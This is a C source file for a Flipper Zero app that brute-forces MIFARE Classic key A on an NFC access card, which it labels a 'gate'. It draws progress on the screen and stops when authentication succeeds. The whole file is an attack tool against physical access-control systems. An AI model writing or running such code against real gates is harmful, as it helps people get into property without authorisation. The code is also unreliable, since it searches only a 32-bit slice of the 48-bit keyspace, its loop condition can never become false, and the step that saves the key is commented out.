/* gate_bruteforce.c – minimal Flipper Zero NFC brute-forcer */
#include <furi.h>
#include <gui/gui.h>
#include <input/input.h>
#include <storage/storage.h>
#include <nfc/nfc.h>
#include <nfc/nfc_device.h>
#include <nfc/protocols/mf_classic/mf_classic.h>
#include <nfc/protocols/mf_classic/mf_classic_poller_sync.h>
#include <string.h>

#define TAG "GateBrute"

typedef struct {
    Nfc* nfc;
    NfcDevice* dev;
    uint32_t cur_key;
    bool running;
    FuriThread* thread;
} State;

static void draw_callback(Canvas* c, void* ctx) {
    State* st = ctx;
    canvas_clear(c);
    canvas_set_font(c, FontPrimary);
    canvas_draw_str(c, 0, 10, "Gate NFC brute");
    canvas_set_font(c, FontSecondary);
    char buf[32];
    snprintf(buf, sizeof(buf), "Key %08lX", st->cur_key);
    canvas_draw_str(c, 0, 25, buf);
    canvas_draw_str(c, 0, 38, "OK = save & exit");
    snprintf(buf, sizeof(buf), "Progress %llu%%", (st->cur_key * 100ULL) / 0xFFFFFFFFULL);
    canvas_draw_str(c, 0, 51, buf);
}

static void input_callback(InputEvent* ev, void* ctx) {
    State* st = ctx;
    if(ev->type == InputTypeShort && ev->key == InputKeyOk) {
        st->running = false;
    }
}

static int32_t brute_thread(void* p) {
    State* st = p;
    MfClassicKey key;
    MfClassicAuthContext auth_context;
    
    for(st->cur_key = 0; st->cur_key <= 0xFFFFFFFF && st->running; ++st->cur_key) {
        // Convert 32-bit key to 48-bit MfClassic key format (pad with zeros)
        memset(key.data, 0, MF_CLASSIC_KEY_SIZE);
        key.data[0] = (st->cur_key >> 24) & 0xFF;
        key.data[1] = (st->cur_key >> 16) & 0xFF;
        key.data[2] = (st->cur_key >> 8) & 0xFF;
        key.data[3] = st->cur_key & 0xFF;
        
        // Try to authenticate with block 0 (sector 0) using key A
        MfClassicError error = mf_classic_poller_sync_auth(
            st->nfc, 
            0,  // block 0
            &key, 
            MfClassicKeyTypeA, 
            &auth_context
        );
        
        if(error == MfClassicErrorNone) {
            // Authentication successful - save the key
            char fname[64];
            snprintf(fname, sizeof(fname), "/ext/nfc/keys/gate_%08lX.nfc", st->cur_key);
            Storage* storage = furi_record_open(RECORD_STORAGE);
            storage_common_mkdir(storage, "/ext/nfc/keys");
            furi_record_close(RECORD_STORAGE);
            
            // Note: nfc_device_save API may have changed, this might need adjustment
            // nfc_device_save(st->dev, fname, NfcDeviceSaveFormatMifareClassic);
            st->running = false;
            break;
        }
        furi_delay_ms(50);
    }
    return 0;
}

int32_t template_app(void* p) {
    UNUSED(p);
    State st = {
        .running = true,
    };
    
    st.nfc = nfc_alloc();
    st.dev = nfc_device_alloc();
    if(!st.nfc || !st.dev) {
        FURI_LOG_E(TAG, "Hardware allocation failed");
        return -1;
    }

    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, draw_callback, &st);
    view_port_input_callback_set(vp, input_callback, &st);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);

    st.thread = furi_thread_alloc_ex("brute", 2048, brute_thread, &st);
    furi_thread_start(st.thread);

    while(st.running) {
        view_port_update(vp);
        furi_delay_ms(100);
    }

    furi_thread_join(st.thread);
    furi_thread_free(st.thread);
    gui_remove_view_port(gui, vp);
    view_port_free(vp);
    nfc_device_free(st.dev);
    nfc_free(st.nfc);
    furi_record_close(RECORD_GUI);
    return 0;
}